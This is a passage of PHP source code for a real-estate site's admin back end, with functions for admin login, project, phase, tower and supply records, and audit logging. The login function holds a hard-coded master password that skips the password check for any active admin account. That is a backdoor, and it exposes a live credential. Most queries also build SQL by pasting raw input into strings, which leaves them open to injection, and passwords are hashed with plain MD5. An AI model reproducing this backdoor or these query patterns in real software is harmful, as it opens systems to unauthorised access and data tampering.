<?php

	/**
	 ************************************************
	 * Function ChkAdminLogin
	 ************************************************
	 **/
	function ChkAdminLogin($Username,$Password) {


		$Sql 	= "SELECT USERNAME FROM ".ADMIN." WHERE USERNAME='".$Username."' AND STATUS='Y' ";
		if($Password!="!proptiger@54321!")
		{
			$Sql 	.= " AND ADMINPASSWORD='".md5($Password)."' ";
		}

		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function ChkAdminLogin()');
		if(mysql_num_rows($ExecSql)>=1)
			return TRUE;
		else
			return FALSE;
	}

	/**
	 ************************************************
	 * Function AdminLoginDetail
	 ************************************************
	 **/
	function AdminLoginDetail($Username) {
		 $Sql 		= "SELECT * FROM ".ADMIN." WHERE USERNAME='".$Username."'";
		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function AdminLoginDetail()');
		if(mysql_num_rows($ExecSql)>=1) {

			$Res 							= 	mysql_fetch_assoc($ExecSql);
			$ResDetails['adminId'] 			= 	$Res['ADMINID'];
			$ResDetails['fName'] 			= 	$Res['FNAME'];
			$ResDetails['lName'] 			= 	$Res['LNAME'];
			$ResDetails['userName'] 		= 	$Res['USERNAME'];
			$ResDetails['userPassword'] 	= 	$Res['ADMINPASSWORD'];
			$ResDetails['userEmail'] 		= 	$Res['ADMINEMAIL'];
			$ResDetails['userAddDate'] 		= 	$Res['ADMINADDDATE'];
			$ResDetails['userLastLogin'] 	= 	$Res['ADMINLASTLOGIN'];
			$ResDetails['userStatus'] 		= 	$Res['STATUS'];
			$ResDetails['ACCESS_LEVEL'] 	= 	$Res['ACCESS_LEVEL'];
			$ResDetails['LAST_LOGIN_DATE'] 	= 	$Res['LAST_LOGIN_DATE'];
			$ResDetails['LAST_LOGIN_IP'] 	= 	$Res['LAST_LOGIN_IP'];
			$ResDetails['BRANCH_LOCATION'] 	= 	$Res['BRANCH_LOCATION'];
			$ResDetails['DEPARTMENT'] 	= 	$Res['DEPARTMENT'];
			return $ResDetails;
		} else {
			return 0;
		}
	}

	/**
	 ************************************************
	 * Function AdminAuthenticationLogin
	 ************************************************
	 **/
	function AdminAuthenticationLogin() {

		if ($_SESSION['AdminLogin'] == "Y") {
			header("Location:Desktop.php");
		}
	}

	/**
	 ************************************************
	 * Function AdminAuthentication
	 ************************************************
	 **/
	function AdminAuthentication() {

		if ($_SESSION['AdminLogin'] != "Y") {
			header("Location:index.php");
			exit;
		}
	}


	function getDatesBetweeenTwoDates($fromDate,$toDate)
	{
		$dateMonthYearArr = array();
		$fromDateTS = strtotime($fromDate);
		$toDateTS = strtotime($toDate);

		for($currentDateTS = $toDateTS; $currentDateTS >= $fromDateTS; $currentDateTS = $currentDateTS-(60 * 60 * 24)) {
			$currentDateStr = date("Y-m-d",$currentDateTS);
			$dateMonthYearArr[] = $currentDateStr;
		}
		return $dateMonthYearArr;
	}

	/**
	 ************************************************
	 * Function AdminDetail
	 ************************************************
	 **/
	function AdminDetail($adminId)
	{
		$Sql 		= "SELECT USERNAME,ADMINEMAIL,CONCAT(FNAME,' ',LNAME) AS FNAME, DEPARTMENT FROM " .ADMIN." WHERE ADMINID = '".$adminId."'";
		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function AdminDetail()');
		if(mysql_num_rows($ExecSql)>=1) {
			$Res = mysql_fetch_assoc($ExecSql);
			$ResDetails['userName'] 	 = $Res['USERNAME'];
			$ResDetails['Email'] 	     = $Res['ADMINEMAIL'];
			$ResDetails['name'] 	     = $Res['FNAME'];
			$ResDetails['DEPARTMENT'] 	 = $Res['DEPARTMENT'];
			return $ResDetails;
		} else {
			return 0;
		}
	}
	/**
	 ************************************************
	 * Function AdminDetail
	 ************************************************
	 **/
	function UpdateAdmin($txtusername, $txtuserEmail, $txtFname, $userId)
	{
		 $Sql = "UPDATE ".ADMIN." SET
							USERNAME  	      	= '".$txtusername."',
							ADMINEMAIL 	      	= '".$txtuserEmail."',
							FNAME           		= '".$txtFname."'

							WHERE       ADMINID  =  '".$userId."'";
		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateAdmin()');
			return 1;

	}
	/**
	************************************************
	* Function UpdateAdminPssword
	************************************************
	**/
	function UpdateAdminPssword($adminpass, $oldpassword, $adminid)
	{
		$Sql = "UPDATE ".ADMIN." SET
		ADMINPASSWORD = '".md5($adminpass)."'
		WHERE ADMINID = '".$adminid."' AND ADMINPASSWORD = '".md5($oldpassword)."'
		";
		$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function UpdateAdminPssword()');
		if(mysql_affected_rows()){
		return 1;
		} else {
		return 2;
	}

	}
	/*****************builder detail**********************/
	function BuilderDetail()
	{
		$qryBuilder	=	"SELECT * FROM ".RESI_BUILDER;
		$resBuilder	=	mysql_query($qryBuilder);
		$arrBuilder	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrBuilder['BUILDER_ID'][]			=	 $data['BUILDER_ID'];
			$arrBuilder['BUILDER_NAME'][]		=	 $data['BUILDER_NAME'];
			$arrBuilder['DESCRIPTION'][]		=	 $data['DESCRIPTION'];
			$arrBuilder['AWARDS'][]				=	 $data['AWARDS'];
			$arrBuilder['URL'][]				=	 $data['URL'];
			$arrBuilder['BUILDER_IMAGE'][]		=	 $data['BUILDER_IMAGE'];
			$arrBuilder['DISPLAY_ORDER'][]		=	 $data['DISPLAY_ORDER'];
			$arrBuilder['META_TITLE'][]			=	 $data['META_TITLE'];
			$arrBuilder['META_KEYWORDS'][]		=	 $data['META_KEYWORDS'];
			$arrBuilder['META_DESCRIPTION'][]	=	 $data['META_DESCRIPTION'];
			$arrBuilder['ENTITY'][]				=	 $data['ENTITY'];
			$arrBuilder['ADDRESS'][]			=	 $data['ADDRESS'];
			$arrBuilder['STREET'][]				=	 $data['STREET'];
			$arrBuilder['LOCALITY'][]			=	 $data['LOCALITY'];
			$arrBuilder['CITY'][]				=	 $data['CITY'];
			$arrBuilder['PINCODE'][]			=	 $data['PINCODE'];
			$arrBuilder['ESTABLISHED_DATE'][]	=	 $data['ESTABLISHED_DATE'];
			$arrBuilder['CEO_MD_NAME'][]		=	 $data['CEO_MD_NAME'];
			$arrBuilder['TOTAL_NO_OF_EMPL'][]	=	 $data['TOTAL_NO_OF_EMPL'];

		}
		return $arrBuilder;
	}
	/*****************end builder detail**********************/

	/********builder list with id**************/
	function BuilderArr()
	{
		$qryBuilder	=	"SELECT BUILDER_NAME,BUILDER_ID FROM ".RESI_BUILDER." ORDER BY BUILDER_NAME ASC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrBuilder	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrBuilder[$data['BUILDER_ID']] = $data['BUILDER_NAME'];
		}
		return $arrBuilder;
	}

	/********city list with id**************/
	function CityArr()
	{
		$qryBuilder	=	"SELECT CITY_ID,LABEL FROM ".CITY." ORDER BY LABEL ASC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrCity	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrCity[$data['CITY_ID']] = $data['LABEL'];
		}
		return $arrCity;
	}

	/********suburb list with id**************/
	function SuburbArr($cityId)
	{
		$qryBuilder	=	"SELECT SUBURB_ID,LABEL FROM ".SUBURB." WHERE CITY_ID = '".$cityId."' ORDER BY LABEL ASC";
		$resBuilder	=	mysql_query($qryBuilder);
		$arrCity	=	array();
		while($data = mysql_fetch_assoc($resBuilder))
		{
			$arrCity[$data['SUBURB_ID']] = $data['LABEL'];
		}
		return $arrCity;
	}

	/********Project Type list with id**************/
	function ProjectTypeArr()
	{
		$qrType		=	"SELECT * FROM ".RESI_PROJECT_TYPE." ORDER BY TYPE_NAME ASC";
		$resType	=	mysql_query($qrType) or die(mysql_error());
		$arrType	=	array();
		while($data = mysql_fetch_assoc($resType))
		{
			$arrType[$data['PROJECT_TYPE_ID']] = $data['TYPE_NAME'];
		}
		return $arrType;
	}

	/********bank list**************/
	function BankList()
	{
		$qrBank	=	"SELECT * FROM ".BANK_LIST." ORDER BY BANK_NAME ASC";
		$resBank	=	mysql_query($qrBank) or die(mysql_error());
		$arrBank	=	array();
		while($data = mysql_fetch_assoc($resBank))
		{
			$arrBank[$data['BANK_ID']] = $data['BANK_NAME'];
		}
		return $arrBank;
	}

	/**********project insert***************/
	function InsertProject($txtProjectName, $builderId, $cityId,$suburbId,$localityId,$txtProjectDescription,$txtProjectRemark,$txtAddress,$txtProjectDesc,$txtProjectSource,$project_type,$txtProjectLocation,$txtProjectLattitude,$txtProjectLongitude,$txtProjectMetaTitle,$txtMetaKeywords,$txtMetaDescription,$DisplayOrder,$Active,$Status,$txtProjectURL,$Featured,$txtDisclaimer,$payment,$no_of_towers,$no_of_flats,$pre_launch_date,$eff_date_to,$special_offer,$display_flag,$youtube_link,$bank_list,$price,$app,$approvals,$project_size,$no_of_lift,$powerBackup,$architect,$offer_heading,$offer_desc,$BuilderName,$power_backup_capacity,$no_of_villa,$eff_date_to_prom,$residential,$township,$plot,$open_space,$Booking_Status,$shouldDisplayPrice,$txtCallingRemark,$txtAuditRemark,$launchedUnits,$reasonUnlaunchedUnits)
	{

		if($project_type == '1')
		{
			$no_of_towers = $no_of_towers;
			$no_of_flats  = $no_of_flats;
			$no_of_villa  = '';
			$plot		  = '';
		}
		else if($project_type == '2')
		{
			$no_of_towers = '';
			$no_of_flats  = '';
			$no_of_villa  = $no_of_villa;
			$plot		  = '';
		}
		else if($project_type == '3')
		{
			$no_of_towers = $no_of_towers;
			$no_of_flats  = $no_of_flats;
			$no_of_villa  = $no_of_villa;
			$plot		  = '';
		}
		else if($project_type == '4')
		{
			$no_of_towers = '';
			$no_of_flats  = '';
			$no_of_villa  = '';
			$plot		  = $plot;
		}
		else if($project_type == '5')
		{
			$no_of_towers = '';
			$no_of_flats  = '';
			$no_of_villa  = $no_of_villa;
			$plot		  = $plot;
		}
		else if($project_type == '6')
		{
			$no_of_towers = $no_of_towers;
			$no_of_flats  = $no_of_flats;
			$no_of_villa  = '';
			$plot		  = $plot;
		}

		$Completion = $Completion." Onwards";
		$Sql = "INSERT INTO " .RESI_PROJECT." SET
							PROJECT_NAME  	      		= '".d_($txtProjectName)."',
							PROJECT_DESCRIPTION 	  	= '".d_($txtProjectDescription)."',
							PROJECT_REMARK 	  			= '".d_($txtProjectRemark)."',
							PROJECT_ADDRESS	 	  		= '".d_($txtAddress)."',
							BUILDER_ID 	      			= '".d_($builderId)."',
							BUILDER_NAME 	      		= '".d_($BuilderName)."',
							CITY_ID	      				= '".d_($cityId)."',
							SUBURB_ID		 	      	= '".d_($suburbId)."',
							LOCALITY_ID		 	      	= '".d_($localityId)."',
							OPTIONS_DESC 	      		= '".d_($txtProjectDesc)."',
							PROJECT_TYPE_ID	      		= '".d_($project_type)."',
							LOCATION_DESC	 	      	= '".d_($txtProjectLocation)."',
							LATITUDE			 	    = '".d_($txtProjectLattitude)."',
							LONGITUDE		 	      	= '".d_($txtProjectLongitude)."',
							META_TITLE		 	      	= '".d_($txtProjectMetaTitle)."',
							META_KEYWORDS	 	      	= '".d_($txtMetaKeywords)."',
							META_DESCRIPTION 	      	= '".d_($txtMetaDescription)."',
							ACTIVE			 	      	= '".d_($Active)."',
							PROJECT_STATUS 	      		= '".d_($Status)."',
							PROJECT_URL		 	      	= '".d_($txtProjectURL)."',
							FEATURED			 	    = '".d_($Featured)."',
							COMPLETION_DATE	      		= '".d_($Completion)."',
							PRICE_DISCLAIMER 	      	= '".d_($txtDisclaimer)."',
							PAYMENT_PLAN				=	'".$payment."',
							NO_OF_TOWERS				=	'".$no_of_towers."',
							NO_OF_FLATS					=	'".$no_of_flats."',
							PRE_LAUNCH_DATE             =   '".$pre_launch_date."',
							LAUNCH_DATE					=	'".$eff_date_to."',
							BANK_LIST					=	'".$bank_list."',
							YOUTUBE_VIDEO				=	'".$youtube_link."',
							PRICE_LIST					=	'".addslashes($price)."',
							APPLICATION_FORM			=	'".addslashes($app)."',
							OFFER						=	'".$special_offer."',
							DISPLAY_FLAG				=	'".$display_flag."',
							OFFER_HEADING				=	'".$offer_heading."',
							OFFER_DESC					=	'".$offer_desc."',
							APPROVALS					=	'".$approvals."',
							PROJECT_SIZE				=	'".$project_size."',
							NO_OF_LIFTS_PER_TOWER		=	'".$no_of_lift."',
							POWER_BACKUP				=	'".$powerBackup."',
							ARCHITECT_NAME				=	'".$architect."',
							POWER_BACKUP_CAPACITY		=	'".$power_backup_capacity."',
							NO_OF_VILLA					=	'".$no_of_villa."',
							PROMISED_COMPLETION_DATE	=	'".$eff_date_to_prom."',
							SOURCE_OF_INFORMATION		=	'".$txtProjectSource."',
							RESIDENTIAL					=	'".$residential."',
							TOWNSHIP					=	'".$township."',
                            NO_OF_PLOTS					=	'".$plot."',
							OPEN_SPACE					=	'".$open_space."',
							BOOKING_STATUS 				=	'".$Booking_Status."',
							SHOULD_DISPLAY_PRICE        =     $shouldDisplayPrice,
							CALLING_REMARK				=	'".$txtCallingRemark."',
							AUDIT_REMARK				=	'".$txtAuditRemark."',
							LAUNCHED_UNITS				=	'".$launchedUnits."',
							REASON_UNLAUNCHED_UNITS		=   '".$reasonUnlaunchedUnits."',		
							PROJECT_SMALL_IMAGE			=   '/on-request/sagar-kunj-apartments/defaultprojectsearchimage-small.png'";
							if($display_flag=='1'){
								$Sql.= ", DISPLAY_ORDER_LOCALITY='30', DISPLAY_ORDER ='30'";
							}else{
								$Sql.= ", DISPLAY_ORDER_LOCALITY='99999', DISPLAY_ORDER ='99999'";
							}
			$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function InsertProject()');
			$pid			=	mysql_insert_id();

			audit_insert($pid,'insert','resi_project',$pid);
			return $pid;

			/********************End Query for new project add in display order table*************************************************/

	}

	function d_($str)
	{
		return addslashes($str);
	}


	/**********audit insert***********/
	function audit_insert($rowid,$action,$table,$projectId)
	{
		$qry_ins	=	"
			INSERT INTO audit
			SET
				DONE_BY			=	'".$_SESSION['adminId']."',
				ACTION_DATE		=	now(),
				TABLE_NAME		=	'".$table."',
				ACTION			=	'".$action."',
				ROW_ID			=	'".$rowid."',
				PROJECT_ID      =   '".$projectId."'";
		$res_ins	=	mysql_query($qry_ins) OR DIE(mysql_error());

	}



	function AmenitiesList()
	{
		$qrAmenities=	"SELECT * FROM ".AMENITIES_MASTER." ORDER BY AMENITY_ID ASC";
		$resAmenities	=	mysql_query($qrAmenities) or die(mysql_error());
		$arrAmenities	=	array();
		while($data = mysql_fetch_assoc($resAmenities))
		{
			$arrAmenities[$data['AMENITY_ID']] = $data['AMENITY_NAME'];
		}
		return $arrAmenities;
	}


	/********delete project****************/
	function DeleteProject($projectId)
	{
		$qryDel	=	"DELETE FROM ".RESI_PROJECT." WHERE PROJECT_ID = '".$projectId."'";
		$res_Del=	mysql_query($qryDel);
		if($res_Del)
			return 1;
	}

	/***********function for fetch project detail***************/
	function ProjectDetail($projectId)
	{
		$qrySel	=	"SELECT * FROM ".RESI_PROJECT." WHERE PROJECT_ID = '".$projectId."'";
		$res_Sel=	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
			return $arrDetail;
	}

	/*******************function for fetch builder detail by builder id*****************/
	function fetch_builderDetail($builderId)
	{
			$qrybuild	=	"SELECT * FROM ".RESI_BUILDER." WHERE BUILDER_ID = '".$builderId."'";
			$resbuild	=	mysql_query($qrybuild) or die(mysql_error());
			$databuild	=	mysql_fetch_assoc($resbuild);
			return $databuild;
	}


	/*******************function for fetch project options detail by project id*****************/
	function fetch_projectOptions($projectId)
	{
			$qryopt	=	"SELECT DISTINCT(BEDROOMS),UNIT_TYPE FROM ".RESI_PROJECT_OPTIONS." WHERE PROJECT_ID = '".$projectId."'";
			$resopt	=	mysql_query($qryopt) or die(mysql_error());
			$arrOptions	 = array();
			while($data = mysql_fetch_assoc($resopt))
			{
				$bedroom = $data['UNIT_TYPE']."-".$data['BEDROOMS'];
				array_push($arrOptions,$bedroom);
			}
			return $arrOptions;
	}

	function fetch_sourceofInformation()
	{
			$qryopt	=	"SELECT DISTINCT(SOURCE_NAME) FROM ".RESI_SOURCEOFINFORMATION."";
			$resopt	=	mysql_query($qryopt) or die(mysql_error());
			$arrOptions	 = array();
			while($data = mysql_fetch_assoc($resopt))
			{
				array_push($arrOptions,$data);
			}
			return $arrOptions;
	}

	function insert_towerDetail($towerDetail,$projectId)
	{
		  $qry_ins	=	"
				INSERT INTO ". RESI_PROJECT_TOWER_DETAILS." 
								(TOWER_ID,PROJECT_ID,TOWER_NAME,NO_OF_FLOORS,REMARKS,STILT,NO_OF_FLATS,TOWER_FACING_DIRECTION,ACTUAL_COMPLETION_DATE)
								VALUES ".$towerDetail;

		$res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
		if($res_ins)
		{
			$last_id = mysql_insert_id();
			audit_insert($last_id,'insert','resi_project_tower_details',$projectId);
			return 1;
		}

	}

    function insert_phase($projectId,$phasename,$launch_date,$completion_date,$remark) {
        $qry_ins	=	"
                    INSERT INTO ". RESI_PROJECT_PHASE."
                    SET
                        PROJECT_ID				            =	'".$projectId."',
                        PHASE_NAME	            			=	'".$phasename."',
                        LAUNCH_DATE  		            	=	'".$launch_date."',
                        COMPLETION_DATE  		       	    =	'".$completion_date."',
                        REMARKS		            			=	'".$remark."'";

        $res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
        if($res_ins)
        {
            $last_id = mysql_insert_id();
            audit_insert($last_id,'insert','resi_project_phase',$projectId);
            return $last_id;
        }
    }

function set_phase_quantity($phaseId,$unit_type,$bedrooms,$quantity,$projectId='') {
    	$qry_select	=	"
			      SELECT COUNT(*) as count FROM ".RESI_PROJECT_PHASE_QUANTITY."
                    WHERE
					PHASE_ID     =  '".$phaseId."' AND
                	UNIT_TYPE	 =	'".$unit_type."' AND
                	BEDROOMS  	 =	'".$bedrooms."'";
        $res_Sel =	mysql_query($qry_select);
        $row = mysql_fetch_assoc($res_Sel);
        if($row['count']>0) {
	        $qry_update	=	"
				      UPDATE ".RESI_PROJECT_PHASE_QUANTITY."
	                  SET
	                    QUANTITY  	 =	'".$quantity."'
	                    WHERE
						PHASE_ID     =  '".$phaseId."' AND
	                	UNIT_TYPE	 =	'".$unit_type."' AND
	                	BEDROOMS  	 =	'".$bedrooms."'";
	        $res_update = mysql_query($qry_update) OR DIE(mysql_error());
		if($projectId!='') {
			if($quantity=='') $quantity=0;
			$ins = "UPDATE resi_proj_supply SET NO_OF_FLATS='".$quantity."' WHERE PROJECT_ID='".$projectId."' AND PHASE_ID='".$phaseId."' AND NO_OF_BEDROOMS='".$bedrooms."' AND PROJECT_TYPE='".$unit_type."' ORDER BY PROJ_SUPPLY_ID DESC LIMIT 1";
			mysql_query($ins);
	        }
	}
        else {
        	$qry_insert	=	"
			      INSERT INTO ".RESI_PROJECT_PHASE_QUANTITY."
                  SET
                    PHASE_ID     =  '".$phaseId."',
                	UNIT_TYPE	 =	'".$unit_type."',
                	BEDROOMS  	 =	'".$bedrooms."',
                	QUANTITY  	 =	'".$quantity."'";
        	$res_insert = mysql_query($qry_insert) OR DIE(mysql_error());
		if($projectId!='') {
			if($quantity=='') $quantity=0;
			$ins = "INSERT INTO resi_proj_supply (PROJECT_ID,PHASE_ID,NO_OF_BEDROOMS,NO_OF_FLATS,SUBMITTED_DATE,PROJECT_TYPE)
					VALUES ('".$projectId."','".$phaseId."','".$bedrooms."','".$quantity."','".date('Y-m-d H:i:s')."','".$unit_type."')";
			mysql_query($ins);
		}
        	}
        }        

    function get_phase_quantity($phaseId) {
    	$qrySel	 =	"SELECT UNIT_TYPE, GROUP_CONCAT(CONCAT(BEDROOMS, ':', QUANTITY)) as AGG from ".RESI_PROJECT_PHASE_QUANTITY." WHERE PHASE_ID='".$phaseId."' GROUP BY UNIT_TYPE";
		$res_Sel =	mysql_query($qrySel);
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
		$details = array();
		foreach ($arrDetail as $result) {
		   $details[$result['UNIT_TYPE']] = $result['AGG'];
		}
		return $details;
    }

    function explode_bedroom_quantity($val) {
	    $arr = array();
	    $bedrooms = explode(',', $val);
	    foreach ($bedrooms as $value) {
	        $v = explode(':', $value);
	        $arr[$v[0]] = $v[1];
	    }
	    return $arr;
    }

    function update_towers_for_project_and_phase($projectId, $phaseId, $tower_array) {
    	$tower_ids = join(',',$tower_array);
    	if($tower_ids) {
			$qry_ins	=	"
				UPDATE ". RESI_PROJECT_TOWER_DETAILS."
				SET
					PHASE_ID	=	COALESCE(
										CASE WHEN TOWER_ID IN (".$tower_ids.") THEN ".$phaseId." ELSE NULL END,
										CASE WHEN PHASE_ID=".$phaseId." THEN NULL ELSE PHASE_ID END
									)
				WHERE
					PROJECT_ID	= '".$projectId."'";
    	}
    	else {
    		$qry_ins	=	"
				UPDATE ". RESI_PROJECT_TOWER_DETAILS."
				SET
					PHASE_ID	=	COALESCE(
										CASE WHEN PHASE_ID=".$phaseId." THEN NULL ELSE PHASE_ID END
									)
				WHERE
					PROJECT_ID	= '".$projectId."'";
    	}

		$res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
		if($res_ins)
		{
			$last_id = mysql_insert_id();
			audit_insert($last_id,'update','resi_project_tower_details',$projectId);
			return 1;
		}
    }

	function insert_supplyandinventoryDetail($projectId,$config,$no_of_flats,$accuracy_flats,$avilable_no_of_flats,$accuracy_avilable_flats,$edit_reson,$source_of_information,$effDt,$projectType,$phaseid='')
	{

			$qry_ins	=	"
				INSERT INTO ". RESI_PROJ_SUPPLY."
				SET
					PROJECT_ID								=	'".$projectId."',
					NO_OF_BEDROOMS							=	'".$config."',
					NO_OF_FLATS		    					=	'".$no_of_flats."',
					ACCURATE_NO_OF_FLATS_FLAG				=	'".$accuracy_flats."',
					AVAILABLE_NO_FLATS						=	'".$avilable_no_of_flats."',
					ACCURATE_AVAILABLE_NO_OF_FLATS_FLAG		=	'".$accuracy_avilable_flats."',
					EDIT_REASON								=	'".$edit_reson."',
					SOURCE_OF_INFORMATION					=	'".$source_of_information."',
					PROJECT_TYPE							=	'".$projectType."',
					SUBMITTED_DATE							=	'".$effDt."',
					PHASE_ID								=	'".$phaseid."'";

		$res_ins=mysql_query($qry_ins) OR DIE(mysql_error());
		if($res_ins)
		{

			$last_id = mysql_insert_id();

			$returnAvailability = computeAvailability($projectId);
			if($returnAvailability)
			{
				$updateProject = updateAvailability($projectId,$returnAvailability);
				if($updateProject)
				{
			audit_insert($last_id,'insert','resi_proj_supply',$projectId);
			return 1;
		}
			}
		}

	}

    function InsertProjectType($qrylast,$projectId)
    {
     	$qry	=	"INSERT INTO ".PROJECT_OPTIONS." (`PROJECT_ID`, `UNIT_NAME`, `UNIT_TYPE`, `SIZE`, `MEASURE`, `PRICE_PER_UNIT_AREA`, `PRICE_PER_UNIT_AREA_DP`,  `STATUS`, `BEDROOMS`, `CREATED_DATE`, `BATHROOMS` ,`PRICE_PER_UNIT_HIGH`,`PRICE_PER_UNIT_LOW`,`NO_OF_FLOORS`,`VILLA_PLOT_AREA`,`VILLA_NO_FLOORS`,`VILLA_TERRACE_AREA`,`VILLA_GARDEN_AREA`,`BALCONY`,`STUDY_ROOM`,`SERVANT_ROOM`,`POOJA_ROOM`,`LENGTH_OF_PLOT`,`BREADTH_OF_PLOT`,`TOTAL_PLOT_AREA`) values ".$qrylast; //die("here");
        //echo "<br/>";
        $res				=	mysql_query($qry);
        $optionId = mysql_insert_id();
        audit_insert($optionId,'insert','resi_project_options',$projectId);

        if($res)
            return true;
        else
            return false;
        /*****************End Query for price_history insertion*********************/
    }


function RoomCategoryList()
	{
		$qrCategory=	"SELECT * FROM ".ROOM_CATEGORY." ORDER BY ROOM_CATEGORY_ID ASC";
		$resRoomcategory	=	mysql_query($qrCategory) or die(mysql_error());
		$arrroomCategory	=	array();
		while($data = mysql_fetch_assoc($resRoomcategory))
		{
			$arrroomCategory[$data['ROOM_CATEGORY_ID']] = $data['CATEGORY_NAME'];
		}
		return $arrroomCategory;
	}


	/******function for fetch enum in resi project**************/
	function enum_value()
	{

		 $qry = "SELECT COLUMN_TYPE
			FROM INFORMATION_SCHEMA.COLUMNS
			WHERE TABLE_NAME = '".RESI_PROJECT."'
			  AND COLUMN_NAME = 'PROJECT_STATUS'";
		$res  =  mysql_query($qry);
		$arrValue = array();
		while($data = mysql_fetch_assoc($res))
		{
			array_push($arrValue,$data);
		}
			$i = 0;
		$str			=	explode("','",$arrValue[$i]['COLUMN_TYPE']);
		$arrStatus		=	array();
		foreach($str as $val)
		{
			if(strstr($val,"enum('"))
			{
				$val = str_replace("enum('","",$val);
			}
			if(strstr($val,"')"))
			{
				$val = str_replace("')","",$val);
			}
			array_push($arrStatus,$val);
		}
		return $arrStatus;
	}

	/***************function for insert specification***********/
	function InsertSpecification($projectId,$master_bedroom_flooring, $other_bedroom_flooring, $living_room_flooring,$kitchen_flooring,$toilets_flooring,$balcony_flooring,$interior_walls,$exterior_walls,$kitchen_walls,$toilets_walls,$kitchen_fixtures,$toilets_fixtures,$main_doors,$internal_doors,$windows,$electrical_fitting,$others)
	{
		$Sql = "INSERT INTO " .RESI_PROJ_SPECIFICATION." SET

					PROJECT_ID						=	'".$projectId."',
					FLOORING_MASTER_BEDROOM  	    = '".d_($master_bedroom_flooring)."',
					FLOORING_OTHER_BEDROOM 	  		= '".d_($other_bedroom_flooring)."',
					FLOORING_LIVING_DINING	 	  	= '".d_($living_room_flooring)."',
					FLOORING_KITCHEN 	      		= '".d_($kitchen_flooring)."',
					FLOORING_TOILETS 	      		= '".d_($toilets_flooring)."',
					FLOORING_BALCONY	      		= '".d_($balcony_flooring)."',
					WALLS_INTERIOR		 	      	= '".d_($interior_walls)."',
					WALLS_EXTERIOR		 	      	= '".d_($exterior_walls)."',
					WALLS_KITCHEN 	      			= '".d_($kitchen_walls)."',
					WALLS_TOILETS 	      			= '".d_($toilets_walls)."',
					DOORS_MAIN	      				= '".d_($main_doors)."',
					DOORS_INTERNAL	 	      		= '".d_($internal_doors)."',
					WINDOWS			 				= '".d_($windows)."',
					ELECTRICAL_FITTINGS		 	    = '".d_($electrical_fitting)."',
					FITTINGS_AND_FIXTURES_TOILETS	= '".d_($toilets_fixtures)."',
					FITTINGS_AND_FIXTURES_KITCHEN	= '".d_($kitchen_fixtures)."',
					OTHERS		 	      			= '".d_($others)."'";

			$ExecSql = mysql_query($Sql) or die(mysql_error().' Error in function InsertSpecification()');
			$pid	 =	mysql_insert_id();

			audit_insert($pid,'insert','resi_proj_specification',$projectId);
			return $pid;
	}

	/********************/
	function ProjectBedroomDetail($projectId)
	{
		$qrySel	=	"SELECT UNIT_TYPE, GROUP_CONCAT(Distinct BEDROOMS) as BEDS FROM ".RESI_PROJECT_OPTIONS." WHERE PROJECT_ID = '".$projectId."' GROUP BY UNIT_TYPE ORDER BY UNIT_TYPE";
		$res_Sel=	mysql_query($qrySel);
		$sqlResults	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($sqlResults, $data);
		}
		// Array ( [0] => Array ( [UNIT_TYPE] => Apartment [BEDS] => 1,2 ) [1] => Array ( [UNIT_TYPE] => Villa [BEDS] => 3,9 ) )
		// Array ( [0] => Array ( [UNIT_TYPE] => Apartment [BEDS] => 1 ) )
		// Array ( [0] => Array ( [UNIT_TYPE] => Villas [BEDS] => 1,2 ) )
		$details = array();
		foreach ($sqlResults as $result) {
		   $details[$result['UNIT_TYPE']] = explode(",", $result['BEDS']);
		}
		return $details;
		//Array ( [Apartment] => Array ( [0] => 1 [1] => 2 ) [Villa] => Array ( [0] => 3 [1] => 9 ) ) 
	}

	function ProjectOptionDetail($projectId)
	{
		$columns = "P.OPTIONS_ID,P.PROJECT_ID,P.UNIT_NAME,P.UNIT_TYPE,P.SIZE,P.MEASURE,P.PRICE_PER_UNIT_AREA,P.PRICE_PER_UNIT_AREA_DP,P.PRICE_PER_UNIT_AREA_FP,P.STATUS,P.BEDROOMS,P.CLP_VISIBLE,P.DP_VISIBLE,P.FP_VISIBLE,P.DISCLAIMER_CLP,P.DISCLAIMER_DP,P.DISCLAIMER_FP,P.BATHROOMS,P.CREATED_DATE,P.STUDY_ROOM,P.SERVANT_ROOM,P.BALCONY,P.POOJA_ROOM,P.NO_OF_FLATS,P.AVAILABLE_NO_OF_FLATS,P.VILLA_PLOT_AREA,P.VILLA_NO_FLOORS,P.VILLA_TERRACE_AREA,P.VILLA_GARDEN_AREA,P.CARPET_AREA,P.PLOT_AREA_MEASURE,P.PRICE_PER_UNIT_LOW,P.PRICE_PER_UNIT_HIGH,P.RESALE_PRICE,P.EDIT_REASON,P.ACCURATE_FLAG,P.SOURCE_OF_INFORMATION,P.LENGTH_OF_PLOT,P.BREADTH_OF_PLOT,P.TOTAL_PLOT_AREA,P.PRICE_TYPE,P.NO_OF_FLOORS";
				 $qrySel	=	"SELECT 
					$columns,
					GROUP_CONCAT(O.IMAGE_URL) FLOOR_IMAGES 
					FROM 
					   ".RESI_PROJECT_OPTIONS." P
					LEFT JOIN ".RESI_FLOOR_PLANS." O
					ON
						P.OPTIONS_ID = O.OPTION_ID	
				   WHERE P.PROJECT_ID = '".$projectId."'
				   GROUP BY $columns
				   ORDER BY P.SIZE ASC";
		$res_Sel=	mysql_query($qrySel) or die(mysql_error());
		$arrDetail	=	array();
		while($data = mysql_fetch_assoc($res_Sel))
		{
			array_push($arrDetail,$data);
		}
			return $arrDetail;
	}

    function fetch_towerDetails($projectId)
	{
		$qrySel	=	"SELECT 
